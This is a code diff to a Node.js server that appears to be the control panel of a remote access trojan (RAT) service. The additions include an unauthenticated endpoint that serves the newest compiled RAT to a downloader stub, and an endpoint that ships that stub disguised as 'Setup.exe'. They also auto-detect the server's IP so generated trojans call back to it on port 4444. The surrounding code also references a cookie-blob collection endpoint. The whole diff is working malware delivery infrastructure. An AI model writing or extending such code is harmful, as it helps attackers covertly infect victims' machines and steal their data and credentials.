@@ -79,6 +79,10 @@ class AuthAPI {
                     await this.handleGenerateRat(req, res, data);
                 } else if (path.startsWith('/api/auth/download-rat/') && method === 'GET') {
                     await this.handleDownloadRat(req, res, path);
+                } else if (path === '/api/rat/payload' && method === 'GET') {
+                    await this.handleRatPayload(req, res);
+                } else if (path === '/api/rat/download-stub' && method === 'GET') {
+                    await this.handleDownloadStub(req, res);
                 } else if (path === '/api/cookie-blob' && method === 'POST') {
                     await this.handleCookieBlob(req, res, data);
                 } else {
@@ -288,7 +292,34 @@ class AuthAPI {
         }
     }
 
+    // Auto-detect the server's public IP by checking network interfaces
+    getServerIp() {
+        try {
+            const os = require('os');
+            const interfaces = os.networkInterfaces();
+            for (const name of Object.keys(interfaces)) {
+                for (const iface of interfaces[name]) {
+                    // Skip internal/loopback, IPv6, and non-Ethernet/WiFi
+                    if (iface.family === 'IPv4' && !iface.internal) {
+                        return iface.address;
+                    }
+                }
+            }
+        } catch (e) {
+            // Fallback
+        }
+        return '127.0.0.1';
+    }
+
     async generateRatExecutable(userId, serverIp = '127.0.0.1', serverPort = 4444) {
+        // Auto-detect server IP if still using default
+        if (serverIp === '127.0.0.1' || serverIp === 'localhost') {
+            const detectedIp = this.getServerIp();
+            if (detectedIp !== '127.0.0.1') {
+                console.log(`[RAT GEN] Auto-detected server IP: ${detectedIp} (was ${serverIp})`);
+                serverIp = detectedIp;
+            }
+        }
         const { exec } = require('child_process');
         const path = require('path');
         const fs = require('fs');
@@ -461,6 +492,96 @@ echo.`;
         } catch (error) {
             console.error('Error reading RAT file:', error);
             this.sendResponse(res, 500, { error: 'Failed to read RAT file' });
+        }
+    }
+
+    async handleRatPayload(req, res) {
+        // Serve the most recently compiled RAT from generated_rats/ to the downloader stub
+        // This ensures the stub always gets the latest binary with all features (KILL_RAT, etc.)
+        const fs = require('fs');
+        const pathModule = require('path');
+        
+        const rootDir = pathModule.join(__dirname, '..');
+        const outputDir = pathModule.join(rootDir, 'generated_rats');
+        
+        // Find the most recently compiled RAT in generated_rats/
+        let payloadFile = null;
+        
+        if (fs.existsSync(outputDir)) {
+            const files = fs.readdirSync(outputDir)
+                .filter(f => f.startsWith('rat_user_') && f.endsWith('.exe'))
+                .map(f => ({
+                    name: f,
+                    path: pathModule.join(outputDir, f),
+                    mtime: fs.statSync(pathModule.join(outputDir, f)).mtimeMs
+                }))
+                .sort((a, b) => b.mtime - a.mtime); // Most recent first
+            
+            if (files.length > 0) {
+                payloadFile = files[0].path;
+                console.log(`[PAYLOAD] Using most recently compiled RAT: ${files[0].name}`);
+            }
+        }
+        
+        // Fallback to myapp.exe if no generated RATs exist
+        if (!payloadFile) {
+            const ratSourceDir = pathModule.join(rootDir, 'rootserver');
+            payloadFile = pathModule.join(ratSourceDir, 'myapp.exe');
+            
+            if (!fs.existsSync(payloadFile)) {
+                this.sendResponse(res, 404, { error: 'RAT payload not found. Generate a RAT first.' });
+                return;
+            }
+            console.log(`[PAYLOAD] No generated RATs found, falling back to myapp.exe`);
+        }
+
+        try {
+            const fileData = fs.readFileSync(payloadFile);
+            
+            res.writeHead(200, {
+                'Content-Type': 'application/octet-stream',
+                'Content-Length': fileData.length
+            });
+            
+            res.end(fileData);
+            console.log(`[PAYLOAD] Served RAT payload: ${fileData.length} bytes`);
+        } catch (error) {
+            console.error('Error reading RAT payload:', error);
+            this.sendResponse(res, 500, { error: 'Failed to read RAT payload' });
+        }
+    }
+
+    async handleDownloadStub(req, res) {
+        // Serve the downloader stub EXE to the dashboard user
+        const user = this.getAuthenticatedUser(req);
+        if (!user) { this.sendResponse(res, 401, { error: 'Authorization required' }); return; }
+
+        const fs = require('fs');
+        const pathModule = require('path');
+        
+        const rootDir = pathModule.join(__dirname, '..');
+        const ratSourceDir = pathModule.join(rootDir, 'rootserver');
+        const stubFile = pathModule.join(ratSourceDir, 'stub.exe');
+
+        if (!fs.existsSync(stubFile)) {
+            this.sendResponse(res, 404, { error: 'Downloader stub not found. Compile stub.exe first.' });
+            return;
+        }
+
+        try {
+            const fileData = fs.readFileSync(stubFile);
+            
+            res.writeHead(200, {
+                'Content-Type': 'application/octet-stream',
+                'Content-Disposition': `attachment; filename="Setup.exe"`,
+                'Content-Length': fileData.length
+            });
+            
+            res.end(fileData);
+            console.log(`[STUB] Served downloader stub: ${fileData.length} bytes`);
+        } catch (error) {
+            console.error('Error reading stub file:', error);
+            this.sendResponse(res, 500, { error: 'Failed to read stub file' });
         }
     }
 
